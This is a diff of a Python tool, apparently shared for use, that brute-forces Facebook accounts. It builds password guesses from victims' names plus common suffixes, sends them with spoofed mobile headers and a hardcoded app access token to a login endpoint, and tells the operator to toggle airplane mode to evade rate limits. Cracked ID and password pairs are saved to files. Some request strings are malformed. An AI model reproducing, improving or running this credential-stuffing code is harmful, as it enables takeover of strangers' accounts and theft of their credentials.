@@ -196,7 +196,7 @@ def setting():
 		print (' [!] Choice Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method Lol ');print (' [02] Method Fire \033[1;95m');print (' [03] Method slow \033[1;97m')
+	print(logo);print ('\n [01] Method slow ');print (' [02] Method Fire \033[1;95m');print (' [03] Method lol \033[1;97m')
 	hc = input ("\n [#] method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -220,7 +220,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 3 Minutes\033[1;0m\n')
+	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode✈️On/Off Every 2 Minutes\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -238,7 +238,7 @@ def first():
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'07867860')
+					pwv.append(frs+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -247,7 +247,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 2 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -267,7 +267,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane ✈️ Mode On/Off Every 2 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -277,16 +277,16 @@ def name2():
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs+'@123')
-					pwv.append(frs+'07867860')
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'@786')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'1234')
 					pwv.append(frs+'786')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
@@ -300,7 +300,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[starting] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[Count] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[starting] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Count] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -395,7 +395,7 @@ logo = """\033[1;30m
 \033[1;39m━▷ \033[0;92m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;33mFACEBOOK ZONE 🙂🙈
 \033[1;39m━▷ \033[0;92m𝙒𝙋 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;33mSTARTING EXIT SELECT AND JOIN
 \033[1;39m━▷ \033[0;92m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;33mFREE AND ENJOY
-\033[1;39m━▷ \033[0;92m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;91mA.112
+\033[1;39m━▷ \033[0;92m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;91mA.114
 \033[1;39m━▷ \033[1;33m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 Tabish 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 CH
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
  
@@ -404,7 +404,6 @@ class Main:
 		self.id = []
 		self.ok = []
 		self.cp = []
-		self.cokie= []
 		self.loop = 0
 		os.system("clear")
 		print(logo)
@@ -412,7 +411,6 @@ class Main:
 		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
 		print("\033[1;37m     FIRST OF ALL SUBSCRIBE MY CHANNEL")
 		print("\033[1;33m     ●▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;33m●▬▬▬▬▬▬▬▬▬▬▬▬●")
-		
 		print(" \033[1;39m━▷\033[1;32m [1] Facebook hacking ")
 		print(" \033[1;39m━▷\033[1;31m [0] Exit")
 		print("   🇵🇰")
@@ -858,11 +856,11 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-    'authority': 'm.alpha.facebook.com',
+    'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=p_F6ZVcY0gWnwB5epftPtG4_; sb=p_F6ZaYbjpM9GISFQ9CGCgOg; m_pixel_ratio=2.8125; wd=384x745; fr=0hAjpmYwSLZIOZm8L..BlevGn.eK.AAA.0.0.BlevG6.AWXs0ZBGxog',
+    # 'cookie': 'datr=kBx8ZX8wF2uRbFKg_Y0qsT4U; sb=kBx8ZQNG4NiJ_kZBVhK061qw; m_pixel_ratio=2.8125; wd=384x745; fr=0RL6yePq1zuO56vDv..BlfByQ.nC.AAA.0.0.BlfByR.AWUE5rFeP3o',
     'dpr': '2.8125',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
@@ -877,8 +875,9 @@ class Main:
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
-			response = ses.get("https://m.alpha.facebook.com/', cookies=cookies, headers=headers") 
+    'viewport-width': '980',
+}
+			response = ses.get("https://mbasic.facebook.com/', cookies=cookies, headers=headers") 
 			if "session_key" in response.text and "EAA" in response.text:
 				print("\r \033[0;92m[Ch Tabish-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
@@ -1300,29 +1299,18 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=Je96ZV9R7LuOIpEML5j0BFzR; sb=Je96ZYJk78YxpmliBN4ql8kO; m_pixel_ratio=2.8125; wd=384x745; fr=0jJTxeixxM2jft5HP..Bleu8l.5p.AAA.0.0.Bleu8o.AWX-VBLJdio',
-    'dpr': '2.8125',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"IN2019"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
-			response = ses.get("https://mbasic.facebook.com/', cookies=cookies, headers=headers") 
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": rua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[Chaudhary-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[Ch Tabish-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-Ch Tabish-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
